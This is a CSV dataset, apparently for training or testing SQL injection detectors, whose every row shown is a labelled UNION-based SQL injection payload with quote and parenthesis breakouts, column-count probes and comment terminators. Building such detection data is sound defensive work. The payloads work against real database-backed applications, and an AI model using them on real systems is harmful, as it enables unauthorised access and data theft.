label,payload,family
attack,"-8369""   )    )    union all select 2191--",union
attack,"1'   )    )     )   union all select null,null,null,null,null#",union
attack,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",union
attack,"-5524  )   as eoyk where 6928  =  6928 union all select 6928,6928,6928,6928,6928,6928,6928,6928,6928--",union
attack,"1 union all select null,null,null,null,null,null,null,null--",union
attack,"-5247"" union all select 3097,3097,3097,3097,3097,3097,3097#",union
attack,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",union
attack,"1'+  (  select gajr where 6653  =  6653 union all select null,null,null,null#",union
attack,"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1'   )    )    as fwhv where 3921  =  3921 union all select null,null--",union
attack,"1%""  )   union all select null,null,null,null#",union
attack,"1'  )   as bfgl where 8959  =  8959 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-7795""  )   where 1712  =  1712 union all select 1712,1712,1712,1712#",union
attack,"1' union all select null,null#",union
attack,"1'  )   as siyk where 1514  =  1514 union all select null,null,null,null,null,null#",union
attack,"-8971'||  (  select 'smyx' where 7970  =  7970 union all select 7970,7970,7970,7970,7970,7970,7970#",union
attack,"1%""  )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"1' in boolean mode  )   union all select null,null--",union
attack,"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",union
attack,"-4347' union all select 6074,6074,6074,6074,6074,6074,6074--",union
attack,"-6370'   )    )    as sims where 9388  =  9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",union
attack,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",union
attack,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",union
attack,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",union
attack,"1   )    )    union all select null,null,null,null,null,null--",union
attack,"-2226%""   )    )    union all select 1018,1018,1018,1018--",union
attack,"-8364'  )   union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#",union
attack,"-3179'+  (  select 'tzzz' where 3191  =  3191 union all select 3191,3191,3191,3191,3191#",union
attack,"1""   )    )    as rfgu where 4880  =  4880 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-3326'+  (  select xitp where 7621  =  7621 union all select 7621,7621,7621,7621,7621,7621,7621,7621,7621,7621#",union
attack,"-8002'   )    )     )   union all select 6647,6647,6647--",union
attack,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",union
attack,"1%'   )    )    union all select null,null#",union
attack,"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",union
attack,"1   )    )    as huxq where 7451  =  7451 union all select null,null,null--",union
attack,"1""  )   union all select null,null,null,null#",union
attack,-4960'  )   union all select 5300--,union
attack,"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",union
attack,"1%'  )   union all select null,null,null,null,null,null,null,null,null#",union
attack,-6165%'   )    )    union all select 5384#,union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",union
attack,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",union
attack,"-5572""  )   union all select 8131,8131#",union
attack,"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-4091   )    )    as lqqy where 3030  =  3030 union all select 3030,3030,3030#",union
attack,"-1949""   )    )    as urke where 8761  =  8761 union all select 8761,8761,8761,8761,8761,8761,8761#",union
attack,"1%' union all select null,null,null,null,null,null,null,null--",union
attack,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",union
attack,"1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#",union
attack,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",union
attack,"1 union all select null,null,null,null,null,null#",union
attack,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",union
attack,-9690 union all select 7217#,union
attack,"-5706""   )    )    union all select 2013,2013,2013,2013#",union
attack,"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",union
attack,"-9140""   )    )    union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",union
attack,"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",union
attack,"-7122""  )   union all select 4002,4002,4002,4002,4002,4002,4002,4002#",union
attack,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",union
attack,"1 union all select null,null,null,null,null#",union
attack,"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",union
attack,"1 where 1992  =  1992 union all select null,null--",union
attack,"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",union
attack,"1   )    )    union all select null,null,null,null#",union
attack,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",union
attack,"-7601""   )    )     )   union all select 1293,1293,1293,1293,1293,1293,1293,1293--",union
attack,"-4236  )   union all select 5260,5260,5260,5260,5260,5260,5260,5260,5260#",union
attack,"1   )    )     )   union all select null,null,null,null,null,null,null#",union
attack,"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",union
attack,"1'+  (  select oqvo where 7448  =  7448 union all select null,null,null,null,null--",union
attack,"-4756%'   )    )    union all select 7824,7824,7824,7824,7824,7824,7824,7824#",union
attack,"-2375 union all select 1573,1573,1573,1573#",union
attack,"-7409""   )    )    union all select 3145,3145,3145--",union
attack,-2050' union all select 5606#,union
attack,"-6220' union all select 1462,1462#",union
attack,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null,null,null#",union
attack,"-2929""   )    )     )   union all select 8999,8999#",union
attack,"-4772   )    )     )   union all select 3879,3879,3879,3879,3879--",union
attack,"-6007""   )    )    union all select 6019,6019,6019,6019,6019,6019,6019,6019--",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null--",union
attack,"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-6389"" union all select 2355,2355,2355,2355,2355--",union
attack,"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",union
attack,"-2896'   )    )    as wisk where 1030  =  1030 union all select 1030,1030,1030,1030#",union
attack,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",union
attack,"1%'   )    )     )   union all select null,null#",union
attack,"-9179""  )   union all select 7144,7144,7144,7144,7144,7144,7144,7144--",union
attack,"1  )   union all select null,null,null,null,null,null,null#",union
attack,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",union
attack,"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1'   )    )    union all select null,null,null,null,null--",union
attack,"-9156'   )    )    union all select 9110,9110,9110,9110#",union
attack,"1%""   )    )     )   union all select null,null,null#",union
attack,"-2246""   )    )    union all select 4613,4613,4613,4613,4613,4613#",union
attack,"-7845' union all select 9574,9574,9574,9574,9574,9574#",union
attack,"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",union
attack,"-4166%""  )   union all select 5190--",union
attack,"1""   )    )    as hdyn where 6027  =  6027 union all select null,null,null--",union
attack,"1  )   where 7425  =  7425 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-4927'   )    )    union all select 1924,1924#",union
attack,"1%""  )   union all select null,null,null,null--",union
attack,"1'   )    )     )   union all select null,null,null#",union
attack,"-4964""   )    )    union all select 4750,4750,4750,4750,4750--",union
attack,"1%'  )   union all select null,null,null--",union
attack,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",union
attack,"-4960 union all select 4031,4031#",union
attack,1' union all select null#,union
attack,"-3137'||  (  select 'btif' where 1718  =  1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",union
attack,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",union
attack,"-9337  )   union all select 5648,5648,5648,5648,5648#",union
attack,"-2734'  )   union all select 5510,5510,5510,5510,5510#",union
attack,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",union
attack,"-5998%""  )   union all select 2366,2366,2366,2366#",union
attack,"-6129 union all select 9122,9122#",union
attack,"-5945'   )    )     )   union all select 4266,4266,4266,4266,4266--",union
attack,"-2701""   )    )    as wvht where 5401  =  5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",union
attack,"1   )    )     )   union all select null,null,null,null,null,null#",union
attack,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",union
attack,"1'||  (  select 'xhqy' where 4531  =  4531 union all select null,null--",union
attack,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",union
attack,"1'  )   union all select null,null,null,null--",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"-3954'   )    )    union all select 2417,2417--",union
attack,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",union
attack,"1""  )   where 9770  =  9770 union all select null,null,null,null,null,null--",union
attack,"1'+  (  select ocvc where 6981  =  6981 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1   )    )    union all select null,null,null,null,null,null,null--",union
attack,"-6214"" union all select 3323,3323#",union
attack,-7979'+  (  select 'bkvt' where 3613  =  3613 union all select 3613#,union
attack,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",union
attack,"1%""  )   union all select null--",union
attack,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",union
attack,"1%' union all select null,null,null,null,null,null,null#",union
attack,"-7868' in boolean mode  )   union all select 5117,5117,5117,5117,5117,5117,5117,5117,5117#",union
attack,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",union
attack,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",union
attack,"1'+  (  select rqcw where 9002  =  9002 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1'  )   union all select null,null,null,null,null,null--",union
attack,"1""  )   union all select null,null,null,null,null,null--",union
attack,"1"" where 8241  =  8241 union all select null,null,null#",union
attack,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",union
attack,"1'+  (  select cjcp where 2590  =  2590 union all select null,null,null,null,null,null,null#",union
attack,"-3666""   )    )     )   union all select 4136,4136,4136--",union
attack,"-3037  )   where 9024  =  9024 union all select 9024,9024--",union
attack,"1   )    )    union all select null,null,null,null--",union
attack,-2452'   )    )     )   union all select 1951--,union
attack,"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1""   )    )    as maxe where 5883  =  5883 union all select null,null,null,null,null,null,null,null,null#",union
attack,1'  )   union all select null--,union
attack,"-3379  )   union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",union
attack,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",union
attack,"1'+  (  select yfuu where 1717  =  1717 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-2048   )    )    union all select 7054,7054,7054,7054,7054,7054,7054,7054,7054--",union
attack,"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",union
attack,"1  )   union all select null,null,null,null#",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null--",union
attack,"1 union all select null,null,null,null,null,null--",union
attack,-1304'  )   union all select 7639#,union
attack,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",union
attack,"-8893%'  )   union all select 1254,1254--",union
attack,"-5596'   )    )     )   union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--",union
attack,"-6883""  )   as tbai where 8121  =  8121 union all select 8121,8121,8121,8121,8121,8121,8121,8121--",union
attack,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--",union
attack,"1  )   union all select null,null,null,null,null#",union
attack,-3881   )    )     )   union all select 4438--,union
attack,"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",union
attack,"1  )   union all select null,null--",union
attack,"-5372""  )   as wlqm where 2432  =  2432 union all select 2432,2432,2432,2432,2432,2432#",union
attack,"1  )   where 7815  =  7815 union all select null,null,null,null,null,null,null#",union
attack,"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",union
attack,"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-4152""  )   where 9781  =  9781 union all select 9781,9781,9781,9781,9781--",union
attack,"-6122""  )   union all select 6578,6578--",union
attack,"-4966%"" union all select 4300,4300,4300,4300,4300,4300,4300,4300#",union
attack,"-4394'   )    )    union all select 3409,3409--",union
attack,"-6890""   )    )     )   union all select 1115#",union
attack,"-7255' union all select 2127,2127,2127,2127,2127#",union
attack,"-4385%'   )    )    union all select 6694,6694,6694,6694,6694,6694,6694,6694,6694,6694#",union
attack,"-2009%' union all select 1991,1991#",union
attack,"1  )   where 9206  =  9206 union all select null,null,null,null,null,null#",union
attack,"-1512 union all select 9013,9013,9013,9013#",union
attack,"-6662""   )    )    union all select 6755--",union
attack,"-5776%' union all select 3075,3075,3075,3075,3075--",union
attack,"1'   )    )    as oldh where 9551  =  9551 union all select null,null,null#",union
attack,"1%' union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1'   )    )    union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-8153' where 2436  =  2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",union
attack,"-8093""   )    )    as oboi where 1476  =  1476 union all select 1476,1476,1476,1476#",union
attack,"-3703""   )    )     )   union all select 3293,3293,3293,3293,3293,3293,3293,3293,3293,3293#",union
attack,"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",union
attack,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",union
attack,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",union
attack,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",union
attack,"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",union
attack,"-7797'+  (  select oulr where 7091  =  7091 union all select 7091,7091,7091,7091,7091,7091,7091,7091,7091#",union
attack,"1"" union all select null,null,null,null,null,null,null,null#",union
attack,"-9661""   )    )     )   union all select 2158,2158,2158--",union
attack,"1%'  )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-1949  )   as smyn where 4066  =  4066 union all select 4066,4066--",union
attack,"1 union all select null,null,null,null,null--",union
attack,"-3852'  )   union all select 3577,3577,3577,3577,3577,3577,3577,3577#",union
attack,"1  )   where 5232  =  5232 union all select null,null,null#",union
attack,"-8943%'  )   union all select 7710,7710#",union
attack,"1%' union all select null,null,null,null,null--",union
attack,"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",union
attack,"-2116%'   )    )     )   union all select 7119,7119,7119,7119,7119--",union
attack,"1  )   where 8630  =  8630 union all select null,null--",union
attack,"-5386'  )   union all select 8026,8026,8026,8026,8026,8026#",union
attack,"1"" union all select null,null,null,null#",union
attack,"-2417  )   union all select 2169,2169,2169,2169,2169,2169,2169,2169,2169,2169#",union
attack,"-6368' union all select 6529,6529,6529--",union
attack,"-6478""   )    )    union all select 7087,7087,7087,7087,7087,7087,7087,7087--",union
attack,"-3725'   )    )    union all select 1541,1541,1541,1541,1541#",union
attack,"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",union
attack,"-4947' in boolean mode  )   union all select 3314,3314#",union
attack,"-7101   )    )     )   union all select 4587,4587,4587,4587,4587,4587--",union
attack,"-5300' union all select 2750,2750,2750,2750,2750,2750--",union
attack,"1' in boolean mode  )   union all select null,null,null--",union
attack,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",union
attack,"1'  )   where 7658  =  7658 union all select null,null#",union
attack,"-7065'+  (  select 'bdxr' where 1756  =  1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#",union
attack,"-8588' union all select 2135,2135--",union
attack,"-9566%""  )   union all select 7973,7973,7973,7973--",union
attack,"1   )    )    as debc where 7428  =  7428 union all select null,null,null#",union
attack,"-2549'  )   as zfnf where 1993  =  1993 union all select 1993,1993,1993,1993,1993,1993--",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null#",union
attack,"-2140   )    )    union all select 8174,8174,8174#",union
attack,"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#",union
attack,"-7746'  )   union all select 1998,1998,1998,1998,1998,1998,1998,1998#",union
attack,"1'+  (  select kpso where 1226  =  1226 union all select null,null,null,null,null,null,null,null--",union
attack,-7231   )    )    union all select 7639#,union
attack,"1'   )    )    as kdwc where 5906  =  5906 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",union
attack,"-7611  )   as tuje where 6101  =  6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",union
attack,"-5625"" union all select 6087,6087,6087,6087,6087,6087--",union
attack,"-7744""   )    )     )   union all select 9408,9408,9408,9408--",union
attack,"-5058%' union all select 6789,6789,6789,6789,6789#",union
attack,-9405' union all select 2539--,union
attack,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",union
attack,"-3445 union all select 5505,5505,5505--",union
attack,"1""  )   where 2633  =  2633 union all select null,null,null,null#",union
attack,"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--",union
attack,"-6554'   )    )     )   union all select 4384,4384,4384,4384,4384#",union
attack,"-1164""  )   union all select 6617,6617,6617,6617,6617,6617--",union
attack,"1   )    )    as fynx where 9636  =  9636 union all select null,null,null,null,null--",union
attack,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",union
attack,"1%""   )    )    union all select null,null#",union
attack,"-9145'  )   as xyya where 8950  =  8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",union
attack,"-5097'  )   union all select 8992,8992,8992,8992,8992,8992,8992,8992,8992--",union
attack,"1"" union all select null,null--",union
attack,"-7824""   )    )     )   union all select 3800,3800,3800,3800,3800,3800,3800,3800,3800--",union
attack,"1'  )   as dwgv where 1525  =  1525 union all select null,null--",union
attack,"-4028  )   where 3244  =  3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",union
attack,"1'   )    )    as usrk where 6324  =  6324 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",union
attack,"1""  )   union all select null,null,null,null,null--",union
attack,"1'   )    )    union all select null,null,null,null,null,null--",union
attack,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--",union
attack,"1'  )   as pfwt where 8448  =  8448 union all select null,null,null,null,null,null,null,null,null#",union
attack,"-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--",union
attack,"-5518  )   as yvqm where 7360  =  7360 union all select 7360,7360#",union
attack,"-6492'  )   union all select 7204,7204--",union
attack,"-1755%' union all select 2615,2615,2615,2615,2615,2615#",union
attack,"-9659   )    )     )   union all select 8665,8665,8665,8665,8665,8665,8665--",union
attack,"-9347'  )   union all select 3884,3884#",union
attack,"-4304' where 1005  =  1005 union all select 1005,1005#",union
attack,"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",union
attack,"-1218' union all select 2663,2663,2663,2663--",union
attack,"1  )   union all select null,null,null#",union
attack,"-1807'   )    )    union all select 9853,9853,9853,9853,9853,9853#",union
attack,"-7240'   )    )    union all select 8064,8064,8064#",union
attack,"1"" where 3692  =  3692 union all select null,null--",union
attack,"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",union
attack,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",union
attack,"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",union
attack,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",union
attack,"1'||  (  select 'hrpa' where 1973  =  1973 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-1475""  )   union all select 8611,8611,8611#",union
attack,"1'  )   as saqp where 6612  =  6612 union all select null,null,null,null,null,null,null--",union
attack,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null#",union
attack,"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",union
attack,"1'  )   union all select null,null,null,null,null,null,null--",union
attack,"-5278""   )    )     )   union all select 5264,5264,5264#",union
attack,"-4934"" union all select 5119,5119,5119,5119,5119--",union
attack,"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",union
attack,"1'   )    )     )   union all select null,null,null,null--",union
attack,"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1""   )    )     )   union all select null,null,null,null,null,null--",union
attack,"-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",union
attack,1'   )    )    as wuws where 6917  =  6917 union all select null#,union
attack,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",union
attack,"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",union
attack,"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",union
attack,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",union
attack,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",union
attack,"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",union
attack,"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",union
attack,"-9509  )   union all select 1193,1193,1193#",union
attack,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",union
attack,"1%'   )    )     )   union all select null,null,null#",union
attack,"-3834'   )    )     )   union all select 8313,8313--",union
attack,"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",union
attack,-6190'   )    )     )   union all select 9413--,union
attack,"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%"" union all select null,null,null--",union
attack,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",union
attack,"-2111' union all select 1061,1061,1061--",union
attack,"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",union
attack,"-1573""  )   union all select 3928,3928,3928,3928--",union
attack,-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,union
attack,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",union
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null--",union
attack,"1%' union all select null,null,null,null--",union
attack,-4331  )   as inpx where 9804  =  9804 union all select 9804#,union
attack,"-4596"" union all select 5761#",union
attack,"1%""   )    )    union all select null,null,null,null,null,null,null,null--",union
attack,"-2453""  )   union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",union
attack,"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",union
attack,1  )   as ratg where 3033  =  3033 union all select null--,union
attack,"1'  )   union all select null,null,null,null,null,null,null,null,null,null#",union
attack,1'  )   union all select null#,union
attack,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",union
attack,"1""  )   union all select null,null,null,null,null,null,null,null,null#",union
attack,1'  )   as gogu where 4338  =  4338 union all select null#,union
attack,"-6096'  )   where 1316  =  1316 union all select 1316,1316,1316,1316,1316,1316,1316,1316#",union
attack,"1""  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",union
attack,"1%"" union all select null,null,null,null,null,null--",union
attack,"1'  )   as jysm where 8961  =  8961 union all select null,null#",union
attack,"1"" where 9332  =  9332 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",union
attack,"-5009  )   where 8463  =  8463 union all select 8463,8463,8463,8463,8463,8463--",union
attack,"-4305  )   as ldrt where 2567  =  2567 union all select 2567,2567,2567,2567,2567,2567,2567#",union
attack,"1   )    )    union all select null,null,null--",union
attack,"1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#",union
attack,"-9922'   )    )    union all select 2193,2193,2193--",union
attack,"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1 where 2751  =  2751 union all select null,null,null,null--",union
attack,"-2743 union all select 6757,6757,6757,6757,6757,6757--",union
attack,"-6200' where 9150  =  9150 union all select 9150,9150,9150,9150,9150,9150,9150#",union
attack,"1' union all select null,null,null,null,null--",union
attack,"-3719"" union all select 6609,6609,6609,6609#",union
attack,"-5548' where 4477  =  4477 union all select 4477,4477,4477,4477,4477,4477,4477,4477,4477,4477--",union
attack,"-9774'   )    )     )   union all select 6954,6954,6954#",union
attack,"-7700%'  )   union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",union
attack,"1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",union
attack,1%'   )    )    union all select null#,union
attack,"1""   )    )    as tjdz where 8656  =  8656 union all select null,null,null,null,null--",union
attack,"-3633'  )   where 3513  =  3513 union all select 3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",union
attack,"-4136'   )    )    as cczp where 7052  =  7052 union all select 7052,7052,7052,7052,7052,7052,7052,7052,7052,7052#",union
attack,"-3860' union all select 3510,3510,3510#",union
attack,"-3672""   )    )    union all select 6093#",union
attack,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",union
attack,"1'   )    )    as popm where 6594  =  6594 union all select null,null#",union
attack,"1' where 4272  =  4272 union all select null,null,null,null#",union
attack,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",union
attack,"-4705' where 2029  =  2029 union all select 2029,2029,2029#",union
attack,"-5493""   )    )    union all select 8001,8001--",union
attack,"1'   )    )     )   union all select null,null,null,null,null,null,null#",union
attack,"-4798%'   )    )     )   union all select 3330,3330,3330#",union
attack,"-1337""  )   union all select 7508--",union
attack,"1%""  )   union all select null#",union
attack,-5211 union all select 1754--,union
attack,"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",union
attack,"1   )    )    as mgvw where 4923  =  4923 union all select null,null,null,null--",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null#",union
attack,"1'   )    )    as umah where 3781  =  3781 union all select null,null,null,null#",union
attack,"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",union
attack,"1%'   )    )     )   union all select null,null,null,null--",union
attack,"1%'  )   union all select null,null,null,null,null#",union
attack,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",union
attack,"-3769""   )    )     )   union all select 8456#",union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null#",union
attack,"-3441'   )    )    as dxvt where 9291  =  9291 union all select 9291,9291,9291#",union
attack,"1""   )    )    union all select null,null,null,null,null,null#",union
attack,"-3865'  )   union all select 4935,4935,4935,4935,4935--",union
attack,"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",union
